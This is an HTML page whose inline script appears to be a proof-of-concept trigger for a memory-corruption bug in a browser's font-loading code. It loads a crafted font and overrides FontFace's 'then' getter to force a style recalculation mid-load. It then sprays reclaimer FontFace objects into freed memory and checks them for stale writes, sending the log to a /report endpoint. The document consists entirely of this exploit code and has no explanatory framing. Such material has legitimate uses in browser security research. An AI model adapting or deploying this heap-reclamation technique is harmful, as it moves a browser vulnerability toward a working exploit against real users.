<!doctype html><html><head><meta charset="utf-8"><title>CSF reassoc</title>
<style>body{margin:0;padding:18px;background:#0b0e14;color:#d7dce5;font-family:system-ui}
#o{white-space:pre-wrap;font:12px/1.5 ui-monospace,monospace;color:#9fb4d6}</style>
<style id="invalidate">x {}</style></head>
<body><div id="s">CSF</div><pre id="o"></pre><script>
var out=document.getElementById("o"),LOG=[];
function send(){fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:LOG})}).catch(function(){});}
var _rt=0;function log(s){out.textContent+=s+"\n";LOG.push(s);try{if(_rt)clearTimeout(_rt);_rt=setTimeout(send,300);}catch(e){}}
function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
async function run(){
  log("UA: "+navigator.userAgent);
  var st=document.createElement("style");
  st.textContent="@font-face{font-family:TrigA;src:url(/font/crafted.otf);}";
  document.head.append(st); void document.body.offsetHeight;
  var face=null; for(var f of document.fonts){if(f.family.replaceAll(/['"]/g,"")==="TrigA"){face=f;break;}}
  log("face: "+(face?"found":"missing")); if(!face)return;
  var p=face.loaded;
  var fired=false,reclaimers=[],old=FontFace.prototype.then;
  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
    if(this!==face)return undefined;
    fired=true; log("getter fired — #invalidate re-association");
    var inv=document.querySelector("#invalidate"); if(inv)inv.remove();
    void document.body.offsetHeight;               // synchronous recalc
    // reclaimer = first allocation after the re-association
    for(var i=0;i<0x20;i++){
      try{var rf=new FontFace("R"+i,"local(Helvetica)",{unicodeRange:"U+0043"});document.fonts.add(rf);reclaimers.push(rf);}catch(e){}
    }
    log("reclaimers: "+reclaimers.length);
    return undefined;}});
  log("calling face.load()");
  try{face.load();}catch(e){log("load threw: "+e.message);}
  await sleep(1500);
  Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:old});
  log("settled; fired="+fired);
  var hits=0;
  for(var i=0;i<reclaimers.length;i++){
    var s=reclaimers[i].status, u=reclaimers[i].unicodeRange;
    if(s==="loaded"||s==="loading"){log("R"+i+" status="+s+" ur="+u+" <-- stale write?");hits++;}
  }
  log("status hits: "+hits);
  log("done");
}
run();
</script></body></html>
